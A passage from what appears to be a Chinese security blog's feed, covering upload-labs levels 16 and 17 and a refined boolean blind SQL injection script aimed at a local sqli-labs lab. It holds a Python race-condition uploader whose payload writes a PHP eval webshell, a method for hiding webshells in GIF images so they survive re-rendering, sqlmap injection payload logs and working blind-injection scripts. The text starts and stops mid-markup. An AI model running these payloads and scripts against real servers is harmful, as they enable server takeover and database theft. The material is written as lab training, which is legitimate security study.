class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</div><div class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">$target_path=$UPLOAD_ADDR.basename($filename);</div><div class="line"><span class="comment">// 获得上传文件的扩展名</span></div><div class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</div><div class="line"><span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></div><div class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</div><div class="line">        &#123;</div><div class="line">            <span class="comment">//使用上传的图片生成新的图片</span></div><div class="line">            $im = imagecreatefromjpeg($target_path);</div><div class="line"><span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</div><div class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="comment">//给新图片指定文件名</span></div><div class="line">                srand(time());</div><div class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</div><div class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</div><div class="line">                imagejpeg($im,$newimagepath);</div><div class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></div><div class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</div><div class="line">                unlink($target_path);</div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            $msg = <span class="string">"上传失败！"</span>;</div><div class="line">        &#125;</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</div><div class="line">        &#123;</div><div class="line">            <span class="comment">//使用上传的图片生成新的图片</span></div><div class="line">            $im = imagecreatefrompng($target_path);</div><div class="line"><span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</div><div class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                 <span class="comment">//给新图片指定文件名</span></div><div class="line">                srand(time());</div><div class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</div><div class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</div><div class="line">                imagepng($im,$newimagepath);</div><div class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></div><div class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</div><div class="line">                unlink($target_path);</div><div class="line">                $is_upload = <span class="keyword">true</span>;               </div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            $msg = <span class="string">"上传失败！"</span>;</div><div class="line">        &#125;</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</div><div class="line">        &#123;</div><div class="line">            <span class="comment">//使用上传的图片生成新的图片</span></div><div class="line">            $im = imagecreatefromgif($target_path);</div><div class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</div><div class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="comment">//给新图片指定文件名</span></div><div class="line">                srand(time());</div><div class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</div><div class="line">                $newimagepath = $UPLOAD_ADDR.$newfilename;</div><div class="line">                imagegif($im,$newimagepath);</div><div class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></div><div class="line">                $img_path = $UPLOAD_ADDR.$newfilename;</div><div class="line">                unlink($target_path);</div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            $msg = <span class="string">"上传失败！"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>通过第十六关的php代码可以看到对文件后缀名和MIME类型进行了检查，而且用到了php的<code>imagecreatefromjpeg</code>、<code>imagecreatefrompng</code>、<code>imagecreatefromgif</code>这几个图片处理函数对上传的图片进行了二次渲染生成了新的图片，所以如果在这里上传的是一个普通的图片马，虽然图片马可以上传成功，但是上传的图片马在经过二次渲染后，图片尾部的php代码就会被删除掉，所以在这里不能使用直接在图片尾部添加一句话木马的方式去合成图片马。但是这一关的代码有一个明显的逻辑漏洞，如果这几个二次渲染函数处理的不是一个图片，就会使这几个函数报错，因为这几个二次渲染的函数只会去处理一个图片内部格式正确的图片，所以在这里只需要上传一个后缀名为jpg、png、gif的一句话木马，这样的话上传的一句话木马会绕过后缀名和MIME类型的检查，通过<code>move_uploaded_file</code>上传至服务器，但是遇到二次渲染时，由于上传的不是一个真正的图片，所以二次渲染函数在处理时会因为图片的内部格式报错，从而突破了对图片的二次渲染，这时候页面虽然会显示图片格式不允许，但是上传的一句话木马已经上传到了服务器</strong></p><p><strong>分别上传后缀名为jpg、png、gif的一句话木马，可以看到虽然上传的格式不允许，但是一句话马已经上传成功了</strong></p><p><strong>jpg</strong><br><img src="http://pic.c1imber.top/blog/180613/0hmC35EhHh.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180613/mf0AaDm4h7.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180613/97HfAf14hF.png?imageslim" alt="mark"><br><strong>png</strong><br><img src="http://pic.c1imber.top/blog/180613/8db3Hdmlk3.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180613/Imc99K5gLk.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180613/FC7d5dl7db.png?imageslim" alt="mark"><br><strong>gif</strong><br><img src="http://pic.c1imber.top/blog/180613/ELeK4G3DD1.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180613/3B0JFHl0F2.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180613/6f3G4jC51B.png?imageslim" alt="mark"></p><p><strong>以上只是单单针对这道题，那么如何真正的使用图片马突破二次渲染呢？可以看到如果直接使用在图片添加一句话木马的图片马上传的话，在二次渲染后一句话会被删除，导致图片马不能利用</strong></p><p><strong>按照一般的方法制作三种图片马</strong><br><img src="http://pic.c1imber.top/blog/180611/9cHGg2FKJJ.png?imageslim" alt="mark"><br><strong>上传jpg图片马</strong><br><img src="http://pic.c1imber.top/blog/180611/D995Fg91Hj.png?imageslim" alt="mark"><br><strong>上传后经过<code>imagecreatefromjpeg</code>函数二次渲染，图片尾部的php一句话被删除</strong><br><img src="http://pic.c1imber.top/blog/180611/fdKHc46AAE.png?imageslim" alt="mark"><br><strong>导致jpg图片马不能使用</strong><br><img src="http://pic.c1imber.top/blog/180611/eeb24D4k3I.png?imageslim" alt="mark"><br><strong>上传png图片马</strong><br><img src="http://pic.c1imber.top/blog/180611/e26jJB1aab.png?imageslim" alt="mark"><br><strong>上传后经过<code>imagecreatefrompng</code>函数二次渲染，图片尾部的php一句话被删除</strong><br><img src="http://pic.c1imber.top/blog/180611/6DaBgi2C46.png?imageslim" alt="mark"><br><strong>导致png图片马不能使用</strong><br><img src="http://pic.c1imber.top/blog/180611/beB9B0k8h6.png?imageslim" alt="mark"><br><strong>上传gif图片马</strong><br><img src="http://pic.c1imber.top/blog/180611/hl33HL3Eg2.png?imageslim" alt="mark"><br><strong>上传后经过<code>imagecreatefromgif</code>函数二次渲染，图片尾部的php一句话被删除</strong><br><img src="http://pic.c1imber.top/blog/180611/21A8FJHaA9.png?imageslim" alt="mark"><br><strong>导致gif图片马不能使用</strong><br><img src="http://pic.c1imber.top/blog/180611/lHcG8bFf4c.png?imageslim" alt="mark"></p><p><strong>尝试制作可以真正突破二次渲染的函数，这里可以通过十六进制编辑器查看比较上传前后图片的十六进制 ，找到二次渲染前后十六进制内容没有改变的部分，尝试将图片马写到这些没有改变的部分</strong></p><p><strong>自己对图片的16进制格式不是太理解，导致只制作出来了突破二次渲染的gif图片马，jpg和png都制作失败了，以后有时间再去研究</strong><br><img src="http://pic.c1imber.top/blog/180612/hAj9fmKelg.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180612/aLE7gfmcDh.png?imageslim" alt="mark"><br><strong>将相同的部分（全00）替换为一句话木马，运气比较好，图片并没有损坏，而且绕过了二次渲染，并且没有报php语法错误</strong><br><img src="http://pic.c1imber.top/blog/180612/1IGBmAFhEB.png?imageslim" alt="mark"><br><strong>但是jpg和png就不一样了，出现了很多问题，暂时还没有制作出真正图片二次渲染的jpg、png图片马</strong></p><h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h3><p><strong>要求上传一个webshell到服务器，提示需要代码审计，查看php源代码</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</div><div class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</div><div class="line">    $upload_file = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</div><div class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</div><div class="line">             $img_path = $UPLOAD_ADDR . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div><div class="line">             rename($upload_file, $img_path);</div><div class="line">             $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</div><div class="line">            unlink($upload_file);</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $msg = <span class="string">'上传失败！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><br><strong>通过php代码可以看到对上传的文件后缀做了白名单限制，如果上传的文件后缀如果不是jpg、png、gif的话就会被删除掉。但是这里可以使用竞争上传的方式去突破，同时使用多个进程去上传php文件，php文件的内容是向服务器目录下写一个webshell，之后不断去去访问上传的php文件，如果在删除该php文件之前访问到了该php文件，就会向服务器目录写一个webshell，用python去实现多进程上传</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CompeteUpload</span><span class="params">(list)</span>:</span></div><div class="line">    url=<span class="string">"http://192.168.242.128/upload-labs/Pass-17/index.php"</span></div><div class="line">    geturl=<span class="string">"http://192.168.242.128/upload-labs/upload/info.php"</span></div><div class="line">    file=&#123;<span class="string">'upload_file'</span>:(<span class="string">'info.php'</span>,<span class="string">"&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[ironman]);?&gt;');?&gt;"</span>,<span class="string">'image/jpeg'</span>)&#125;</div><div class="line">    data=&#123;<span class="string">'submit'</span>:<span class="string">'上传'</span>&#125;</div><div class="line">    r=requests.post(url=url,data=data,files=file)</div><div class="line">    <span class="comment">#print "test upload...."</span></div><div class="line">    r1=requests.get(url=geturl)</div><div class="line">    <span class="keyword">if</span> r1.status_code==<span class="number">200</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"upload success!"</span></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    pool = Pool(<span class="number">10</span>)</div><div class="line">    pool.map(CompeteUpload, range(<span class="number">10000</span>))</div><div class="line">    pool.close()</div><div class="line">    pool.join()</div></pre></td></tr></table></figure><p><strong>可以看到通过多进程同时上传时可以成功在文件删除之前访问到该文件</strong><br><img src="http://pic.c1imber.top/blog/180622/ccEGI0A04e.png?imageslim" alt="mark"><br><strong>在服务器目录下可以看到成功写入shell.php</strong><br><img src="http://pic.c1imber.top/blog/180622/lhCj31dk99.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180622/AfKEmfifIB.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;upload-labs通关教程（持续更新）&quot;&gt;&lt;a href=&quot;#upload-labs通关教程（持续更新）&quot; class=&quot;headerlink&quot; title=&quot;upload-labs通关教程（持续更新）&quot;&gt;&lt;/a&gt;upload-labs通关教程（持续更新）&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;最近在圈子里看到的一个文件上传闯关靶场，一共有19关，趁着这个机会做一个教程，以下的内容只是自己的思路，绕过方法有很多种，欢迎大家一起交流，共同学习！&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://lawlietweb.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传" scheme="http://lawlietweb.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>python布尔盲注脚本算法完善</title>
    <link href="http://lawlietweb.com/2018/06/06/pyblindsqlimax/"/>
    <id>http://lawlietweb.com/2018/06/06/pyblindsqlimax/</id>
    <published>2018-06-06T02:11:33.000Z</published>
    <updated>2018-12-19T11:22:49.065Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python布尔盲注脚本算法完善"><a href="#python布尔盲注脚本算法完善" class="headerlink" title="python布尔盲注脚本算法完善"></a>python布尔盲注脚本算法完善</h1><p><strong>完善一下上次写的python盲注工具，之前那个盲注工具在猜取字符的时候使用的二分法，通过查找<code>0-126</code>这个范围去采取数据库中的数据。但是当时遗留了一个问题，就是在逐个猜解数据库字符时使用二分法并没有什么问题，这时因为字符都在<code>0-126</code>这个固定范围内，但是在猜取数据库个数、指定数据库的表个数、字段个数或者表中记录条数时，又或者是数据库名的长度、表名长度、字段名的长度时是没有一个固定的范围的，举个例子，比如在猜取表中记录个数时，记录的个数是不能确定范围的，也就是不能确定二分法的最大值，当时采用了循环自加的方式去判断，速度自然是慢了许多。今天抽时间读了一下sqlmap的payload，通过payload发现sqlmap也考虑到了这种情况，并且处理方法还是不错的。对于这种情况还是可以通过二分法判断的，将自己的方法记录一下~</strong><br><a id="more"></a></p><h3 id="分析sqlmap判断时的payload"><a href="#分析sqlmap判断时的payload" class="headerlink" title="分析sqlmap判断时的payload"></a>分析sqlmap判断时的payload</h3><p><strong>首先看一下sqlmap在判断数据库个数时的payload</strong></p><pre><code>[12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;51 AND &apos;rTJT&apos;=&apos;rTJT[12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;54 AND &apos;rTJT&apos;=&apos;rTJT[12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;52 AND &apos;rTJT&apos;=&apos;rTJT[12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;53 AND &apos;rTJT&apos;=&apos;rTJT[12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))&gt;51 AND &apos;rTJT&apos;=&apos;rTJT[12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))&gt;48 AND &apos;rTJT&apos;=&apos;rTJT[12:09:16] [PAYLOAD] 1&apos; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))&gt;9 AND &apos;rTJT&apos;=&apos;rTJT[12:09:16] [INFO] retrieved: 5</code></pre><p><strong>通过分析payload可以看出sqlmap将count查到的数据库个数使用cast转换为了字符型，然后指定二分法的范围为字符<code>&#39;0&#39;-&#39;9&#39;</code>，其ascii码转换为十进制也就是<code>48-57</code>，这个区域中间值为52，而看上面sqlmap在判断数据库个数时的第一个payload比较的值是51，所以可以确定sqlmap指定的二分法的大致范围确实是48-57(‘0’-‘9’)</strong></p><p><strong>通过对sqlmap的payload的分析，我想到了一种解决之前那个问题的办法，由于查询个数、长度、记录数的结果一定为数字，那么不管这个数字有多大，只要转换为字符串后，它的每一位一定是在<code>&#39;0&#39;-&#39;9&#39;</code>这个范围内，也就是十进制的<code>48-57</code>，所以只需要把数字转换成字符串，然后去使用二分法，指定二分法的范围为<code>48-57</code>，之后通过二分法可以判断出数字字符串每一位的字符，直到不能判断为止，最终就能得到这个数字</strong></p><h3 id="自增查找和二分查找算法对比"><a href="#自增查找和二分查找算法对比" class="headerlink" title="自增查找和二分查找算法对比"></a>自增查找和二分查找算法对比</h3><p><strong>和之前的自增查找做一个对比，首先以猜解数据库个数为例，我的数据库个数为5个</strong></p><p><strong>在不确定二分法范围时采用的自增算法代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">url=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1"</span></div><div class="line">basehtml=requests.get(url=url).content</div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    payload=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1' and (select count(schema_name) from information_schema.schemata)=%d-- "</span>%(i)</div><div class="line">    html=requests.get(url=payload).content</div><div class="line">    <span class="keyword">print</span> payload</div><div class="line">    <span class="keyword">if</span> basehtml==html:</div><div class="line">        <span class="keyword">print</span> i</div><div class="line">        <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        i=i+<span class="number">1</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180606/DDkGlAlEI1.png?imageslim" alt="mark"><br><strong>自增算法发送了5次payload判断出了数据库个数为5</strong></p><p><strong>再看一下刚刚说的二分查找算法代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">url=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1"</span></div><div class="line">basehtml=requests.get(url=url).content</div><div class="line">i=<span class="number">1</span></div><div class="line">s=<span class="string">""</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    count=<span class="number">0</span></div><div class="line">    low=<span class="number">48</span></div><div class="line">    high=<span class="number">57</span></div><div class="line">    <span class="keyword">while</span> low&lt;=high:</div><div class="line">        mid=(low+high)/<span class="number">2</span></div><div class="line">        payload=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1' AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d-- "</span>%(i,mid)</div><div class="line">        <span class="keyword">print</span> payload</div><div class="line">        html=requests.get(url=payload).content</div><div class="line">        <span class="keyword">if</span> basehtml==html:</div><div class="line">            low=mid+<span class="number">1</span></div><div class="line">            count+=<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            high=mid<span class="number">-1</span></div><div class="line">    <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">        s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">        i=i+<span class="number">1</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180606/mdKF3eAHC6.png?imageslim" alt="mark"><br><strong>在这里二分算法发送了6次payload才判断出来了数据库的个数为5，可以看出当数字比较小的时候，上面的二分法的优势并没有体现出来</strong></p><p><strong>那么再举一个例子，比如用盲注判断<code>information_schema</code>这个数据库名的长度，长度为18，相比之前的5大了一些，为2位数，再次对比一下两个算法</strong></p><p><strong>在不确定二分法范围时采用的自增算法代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">url=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1"</span></div><div class="line">basehtml=requests.get(url=url).content</div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    payload=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1' and (select length(schema_name) from information_schema.schemata limit 0,1)=%d-- "</span>%(i)</div><div class="line">    html=requests.get(url=payload).content</div><div class="line">    <span class="keyword">print</span> payload</div><div class="line">    <span class="keyword">if</span> basehtml==html:</div><div class="line">        <span class="keyword">print</span> i</div><div class="line">        <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        i=i+<span class="number">1</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180606/A3HEkh98aB.png?imageslim" alt="mark"><br><strong>发送了18次payload才判断出<code>information_schema</code>数据库名的长度为18</strong></p><p><strong>再看一下刚刚说的二分查找算法代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">url=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1"</span></div><div class="line">basehtml=requests.get(url=url).content</div><div class="line">i=<span class="number">1</span></div><div class="line">s=<span class="string">""</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    count=<span class="number">0</span></div><div class="line">    low=<span class="number">48</span></div><div class="line">    high=<span class="number">57</span></div><div class="line">    <span class="keyword">while</span> low&lt;=high:</div><div class="line">        mid=(low+high)/<span class="number">2</span></div><div class="line">        payload=<span class="string">"http://192.168.3.3/sqli-labs-master/Less-5/index.php?id=1' AND ORD(MID((SELECT IFNULL(CAST(length(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit 0,1),%d,1))&gt;%d-- "</span>%(i,mid)</div><div class="line">        <span class="keyword">print</span> payload</div><div class="line">        html=requests.get(url=payload).content</div><div class="line">        <span class="keyword">if</span> basehtml==html:</div><div class="line">            low=mid+<span class="number">1</span></div><div class="line">            count+=<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            high=mid<span class="number">-1</span></div><div class="line">    <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">        s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">        i=i+<span class="number">1</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180606/CJGgj0b8ga.png?imageslim" alt="mark"><br><strong>可以看到随着数字的增加，二分法的优势体现出来了，只发送了9次payload就判断出了<code>information_schema</code>数据库名的长度为18</strong></p><h3 id="盲注脚本加强版"><a href="#盲注脚本加强版" class="headerlink" title="盲注脚本加强版"></a>盲注脚本加强版</h3><p><strong>修改过后的盲注脚本，注入速度相比之前的那个明显有所提高</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div 